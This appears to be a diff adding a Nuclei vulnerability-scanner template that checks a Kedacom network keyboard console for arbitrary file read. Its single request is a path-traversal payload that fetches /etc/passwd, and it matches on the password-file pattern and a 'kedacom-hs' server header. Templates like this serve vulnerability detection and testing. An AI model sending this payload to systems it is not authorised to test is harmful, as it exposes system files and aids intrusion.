@@ -1,0 +1,34 @@
+id: kedacom-network-lfi
+
+info:
+  name: 科达网络键盘控制台 任意文件读取
+  author: DhiyaneshDk
+  severity: high
+  description: |
+    科达网络键盘控制台存在任意文件读取，响应头带 Server: kedacom-hs。
+    与 DVR 接入网关、Phoenix 监控平台、MTS 转码服务器不是同一 SKU。
+  reference:
+    - https://github.com/projectdiscovery/nuclei-templates
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  tags: kedacom,lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/../../../../../../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+      - type: word
+        part: header
+        words:
+          - "text/html"
+          - "Server: kedacom-hs"
+        condition: and
+      - type: status
+        status:
+          - 200
